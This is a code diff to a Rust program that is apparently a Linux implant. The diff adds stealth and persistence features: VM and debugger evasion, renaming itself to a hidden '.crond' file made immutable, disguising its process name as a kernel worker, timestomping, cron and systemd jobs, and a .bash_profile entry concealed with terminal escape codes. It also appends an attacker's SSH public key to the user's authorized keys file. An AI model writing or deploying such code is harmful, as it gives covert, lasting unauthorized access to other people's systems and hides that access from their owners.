@@ -1,11 +1,13 @@
 #![allow(unused)]
-use std::{env, fs, os::unix::process::CommandExt, path::Path, process::{self, exit, Command}};
+use std::{env, fs::{self, OpenOptions}, io::Write, os::unix::{fs::PermissionsExt, process::CommandExt}, path::Path, process::{self, exit, Command}};
 use nix::{sys::{prctl, stat::utimes, time::TimeVal}, unistd::{fork, getuid, setsid}};
-
 
 const VM: [&str; 5] =  ["vboxuser", "vboxguest", "vmware", "qemu", "hyperv"];
 const DEBUG: [&str; 5] = ["gdb", "r2", "strace", "lldb", "ghidra"];
-const PNAME: &str = "ar.p";
+const PNAME: &str = "[kworker/ar.p]";
+
+// Insert your ssh_pub_key
+const SSH_KEY: &str = "";
 
 
 pub fn check_vm() {
@@ -53,22 +55,27 @@ pub fn check_debugger() {
     }
 }
 
-
-pub fn time_stomp() {
-
-    // Changing time value of access and modified
-    let atime = TimeVal::new(946_684_800, 0);  
-    let mtime = TimeVal::new(946_684_800, 0);
-   
-    let path = env::current_exe().unwrap();
+// Crude way of hiding binary and being persistence on machine
+pub fn hide() {
+            
+    let exe = env::current_exe().unwrap();
+    let fname = exe.file_name().unwrap().to_string_lossy().into_owned();   
+    let crond = Path::new(&env::current_dir().unwrap()).join(".crond");
     
-    // Updating timestamp 
-    utimes(&path, &atime, &mtime).unwrap();
+    if !fname.eq(".crond") {
+        fs::rename(&exe, &crond).unwrap();
+        println!("Binary name changed from:({}) to:(.crond)", fname); 
+        Command::new(crond).exec();
+    }
 
-    println!("TimeStomped to 2000-01-01")
-
+    // Making the binary file as immutable
+    if getuid().is_root() {
+        Command::new("chattr")
+                .args(["+i", &exe.to_string_lossy().into_owned()])
+                .spawn()
+                .unwrap(); 
+    }
 }
-
 
 pub fn process_stomp() {
    
@@ -94,19 +101,37 @@ pub fn process_stomp() {
         exit(0);
     }
     
-    println!("Binary:({}) having pid({}) is spoofed to:({})", env!("CARGO_BIN_NAME"), process::id(), PNAME);
+    println!("Process:({}) is spoofed to:({}) having pid:({})", env::current_exe().unwrap().file_name().unwrap().to_string_lossy().into_owned(), PNAME, process::id());
 }
 
 
-pub fn persistance() {
+pub fn time_stomp() {
+
+    // Changing time value of access and modified
+    let atime = TimeVal::new(946_684_800, 0);  
+    let mtime = TimeVal::new(946_684_800, 0);
+   
+    let path = env::current_exe().unwrap();
     
-    if getuid().to_string() == "0" {
-        println!("Applying system level persistence");
+    // Updating timestamp 
+    utimes(&path, &atime, &mtime).unwrap();
+    println!("TimeStomped to 2000-01-01");
+ 
+}
+
+
+pub fn persistence() {
+    
+    if getuid().is_root() {
+        println!("\n[*] Applying system level persistence [*]");
         crontab();
+        ssh();
         systemd();
     } else {
-        println!("Applying user level persistence");
+        println!("\n[*] Applying user level persistence [*]");
         crontab();
+        ssh();
+        bash();
     }
 
 }
@@ -117,7 +142,7 @@ fn crontab() {
     let expression = format!("* * * * * {}\n", env::current_exe().unwrap().to_string_lossy().to_owned());
     let mut file = env::current_dir().unwrap().to_string_lossy().into_owned();
     file.push_str("/cron");
-
+ 
     let output = Command::new("crontab").arg("-l").output().unwrap();
     let mut task = String::from_utf8(output.stdout).unwrap().trim().to_string();
  
@@ -133,7 +158,8 @@ fn crontab() {
         Command::new("crontab").arg(&file).output().unwrap();
         fs::remove_file(file).unwrap();
     }
-
+    
+    println!("[~] Crontab persistence")
 }
 
 
@@ -160,10 +186,56 @@ fn systemd() {
     fs::write("/etc/systemd/system/ar.p.service", service).unwrap();
     Command::new("systemctl")
             .args(["enable","ar.p"])
-            .spawn()
+            .output()
             .unwrap();
 
+    println!("[~] Systemd persistence");
 }
 
 
+fn bash() {
 
+    let expression = format!("#\x1B[1A\x1B[2K\x1B[1A\n{}\n#\x1B[2K\x1B[1A\x1B[2K\n", env::current_exe().unwrap().to_string_lossy().to_owned());
+   
+    let mut path = env::var("HOME").unwrap();
+    path.push_str("/.bash_profile");
+
+    if !Path::new(&path).exists() {
+        fs::File::create(&path).unwrap();
+        fs::set_permissions(&path, fs::Permissions::from_mode(0o644)).unwrap();  
+    }
+
+    let data = fs::read_to_string(&path).unwrap();
+    if !data.contains(&expression.trim()) && Path::new(&path).exists() {
+        let mut file = OpenOptions::new().append(true).open(&path).unwrap();
+        file.write_all(expression.as_bytes()).unwrap();
+    } 
+
+    println!("[~] Bash_profile persistence");
+}
+
+
+fn ssh() {
+   
+    let ssh = Path::new(&env::var("HOME").unwrap()).join(".ssh");
+    let key = Path::new(&env::var("HOME").unwrap()).join(".ssh/authorized_key");
+
+    if !ssh.exists() {
+        fs::create_dir_all(&ssh).unwrap();
+        fs::set_permissions(&ssh, fs::Permissions::from_mode(0o700)).unwrap();
+    }
+
+    if !key.exists() {
+        fs::File::create(&key).unwrap();
+        fs::set_permissions(&key, fs::Permissions::from_mode(0o600)).unwrap();
+    }
+    
+    let data = fs::read_to_string(&key).unwrap();
+    if !data.contains(SSH_KEY.trim()) {
+        let mut file = OpenOptions::new().append(true).open(&key).unwrap();
+        file.write(b"\n").unwrap();
+        file.write_all(SSH_KEY.as_bytes()).unwrap(); 
+    }
+
+    println!("[~] SSH persistence");
+}
